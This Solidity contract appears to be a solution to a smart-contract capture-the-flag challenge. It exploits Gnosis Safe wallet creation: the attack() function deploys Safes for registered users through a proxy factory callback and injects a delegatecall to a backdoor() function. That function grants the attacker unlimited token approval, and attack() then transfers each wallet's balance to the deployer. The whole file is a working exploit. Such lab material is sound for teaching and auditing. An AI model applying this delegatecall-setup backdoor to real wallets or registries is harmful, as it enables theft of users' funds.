// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract BackdoorAttacker {
    // contract is used for delegatecall - no storage variables
    address public immutable owner;
    address public immutable thisContract; // for delegatecall
    IProxyCreationCallback public immutable registry;
    GnosisSafeProxyFactory public immutable factory;
    GnosisSafe public immutable master;
    IERC20 public immutable token;

    constructor(
        IProxyCreationCallback _registry,
        GnosisSafeProxyFactory _factory,
        GnosisSafe _master,
        IERC20 _token
    ) {
        owner = msg.sender;
        thisContract = address(this);
        registry = _registry;
        factory = _factory;
        master = _master;
        token = _token;
    }

    // for delegatecall from GnosisSafe wallet
    function backdoor() external {
        token.approve(thisContract, type(uint256).max);
        console.log("Approved max tokens from %s", address(this));
    }

    function attack(address[] calldata users) external {
        address[] memory owners = new address[](1);
        for (uint i = 0; i < users.length; i++) {
            owners[0] = users[i];

            bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,
                owners, // wallet owners
                1, // threshold
                thisContract, // additional logic address for delegatecall
                abi.encodeWithSelector(BackdoorAttacker.backdoor.selector), // delegatecall calldata
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy walletProxy = factory.createProxyWithCallback(
                address(master), // master wallet contract address
                init, // init function calldata
                0, // salt
                registry // callback contract address
            );
            address wallet = address(walletProxy);

            console.log("Wallet address is %s", wallet);

            token.transferFrom(wallet, owner, token.balanceOf(wallet));
        }
    }
}